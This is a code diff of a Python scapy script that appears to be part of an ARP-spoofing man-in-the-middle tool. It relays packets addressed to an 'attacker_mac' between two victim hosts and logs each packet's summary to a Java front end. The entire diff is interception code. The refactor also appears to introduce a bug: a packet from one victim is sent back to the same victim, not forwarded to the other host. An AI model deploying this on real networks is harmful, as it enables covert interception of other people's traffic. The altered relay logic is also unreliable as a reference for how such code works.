@@ -32,35 +32,39 @@ def send_packet_info(packet):
                 mac1 = mac_cache.get(ip1)
                 mac2 = mac_cache.get(ip2)
 
-                found = False
                 if mac1 is None or mac2 is None:
                     # Skip pairs with missing MACs
                     continue
 
-                if (src == mac1 and dst == attacker_mac) or (src == mac2 and dst == attacker_mac):
-                    info = {
-                        "type": "packet",
-                        "summary": packet.summary(),
-                    }
-                    print(json.dumps(info), flush=True)
-                    found = True
+                # Check if destination mac address is the user's mac address:
+                if dst == attacker_mac:
+                    if src == mac1:
+                        print_package_in_json(packet)  # Let java know of the packet
+                        redirect_package(mac1, packet)
+                        break
 
-                if src == mac1 and dst == attacker_mac:
-                    new_packet = copy.deepcopy(packet)
-                    new_packet[Ether].src = attacker_mac.lower()
-                    new_packet[Ether].dst = mac2
+                    elif src == mac2:
+                        print_package_in_json(packet)  # Let java know of the packet
+                        redirect_package(mac2, packet)
+                        break
 
-                    sendp(new_packet, iface=conf.iface, verbose=False)
 
-                elif src == mac2 and dst == attacker_mac:
-                    new_packet = copy.deepcopy(packet)
-                    new_packet[Ether].src = attacker_mac.lower()
-                    new_packet[Ether].dst = mac1
+# Creates a new packet with the attacker's mac address
+# as source and the specified destination as destination
+def redirect_package(destination, packet):
+    new_packet = copy.deepcopy(packet)
+    new_packet[Ether].src = attacker_mac.lower()
+    new_packet[Ether].dst = destination
+    sendp(new_packet, iface=conf.iface, verbose=False)
 
-                    sendp(new_packet, iface=conf.iface, verbose=False)
 
-                if found:
-                    break
+# Nicely divides up the packet and writes it in json format and lets java know
+def print_package_in_json(packet):
+    info = {
+        "type": "packet",
+        "summary": packet.summary(),
+    }
+    print(json.dumps(info), flush=True)
 
 
 def spoof_loop():
